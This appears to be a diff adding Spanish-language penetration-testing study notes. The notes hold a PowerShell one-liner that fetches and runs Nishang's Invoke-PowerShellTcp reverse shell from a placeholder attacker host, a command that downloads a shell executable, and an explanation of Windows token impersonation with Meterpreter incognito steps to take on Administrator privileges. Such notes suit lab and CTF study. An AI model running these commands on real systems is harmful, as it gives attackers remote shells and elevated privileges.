@@ -1,0 +1,93 @@
+
+Asi se descarga el archivo de nuestro directorio local en powershell.
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+
+----------------------------------------------
+https://github.com/samratashok/nishang/tree/master/Shells :link de donde descargarlo 
+
+
+PowerShellTcp.ps1 : Este script puede conectarse a un netcat estándar que escucha en un puerto cuando se usa el 
+conmutador -Reverse.Además, un netcat estándar puede conectarse a este script Bind a un puerto específico.
+-----------------------------------------------
+Ejecutar un proceso en powershell es con :
+
+	Start-Process "process.exe"
+
+-----------------------------------------------
+Descargar un archivo en powershell :
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+
+------------------------------------------------
+SUPLANTACION DE TOKEN : 
+
+Se puede usar para obtener acceso al sistema con privilegios.
+
+Windows usa tokens para garantizar que las cuentas tengan los privilegios correctos para llevar a cabo acciones 
+particulares.Los tokens de cuenta se asignan a una cuenta cuando los usuarios inician sesion o se autentican.Esto 
+normalmente lo hace LSASS.exe (piense en esto como un proceso de autenticacion).
+
+Este token de acceso consta de :
+
+
+	- SID de usuario (identificador de seguridad)
+	- SID grupales 
+	- privilegios
+
+Hay dos tipos de token de acceso :
+
+	- tokens de acceso primario : aquellos asociados con una cuenta de usuario que se generan al iniciar sesion.
+
+	- tokens de suplantacion : estos permiten que un proceso en particular obtenga acceso a recursos usando el token 
+	de otro proceso.
+
+
+Para un token de suplantacion ,hay diferenetes niveles :
+
+	- SecurityAnonymous : El usuario/cliente actual no puede hacerse pasar por otro usuario/cliente.
+
+	- SecurityIdentification : El usuario/cliente actual puede obtener la identidad y los privilegios 
+								de un cliente, pero no puede hacerse pasar por el cliente 
+
+	- SecurityImpersonation : El usuario / cliente actual puede suplantar el contexto de seguridad del 
+								cliente en el sistema local
+
+	- SecurityDelegation : El usuario / cliente actual puede suplantar el contexto de seguridad del cliente
+								 en un sistema remoto
+
+
+	Los privilegios de una cuenta (que se otorgan a la cuenta cuando se crean o se heredan de un grupo) permiten 
+	que un usuario realice acciones particulares. Aquí están los privilegios más comúnmente abusados:
+
+	SeImpersonatePrivilege
+	SeAssignPrimaryPrivilege
+	SeTcbPrivilege
+	SeBackupPrivilege
+	SeRestorePrivilege
+	SeCreateTokenPrivilege
+	SeLoadDriverPrivilege
+	SeTakeOwnershipPrivilege
+	SeDebugPrivilege
+
+
+
+
+
+Metodo de explotacion :
+
+	whoami /priv : ver todo los privilegios
+	
+	- load_incognito : con esto cargamos el modulo de incognito 
+	- list_tokens -g : Verificar que tokens estan disponibles
+	
+	- Usar el nombre del token ejemplo : "BUILTIN\Administrators" para hacerse pasar por el token Administrators.
+	
+	 
+
+
+
+
+
+
+
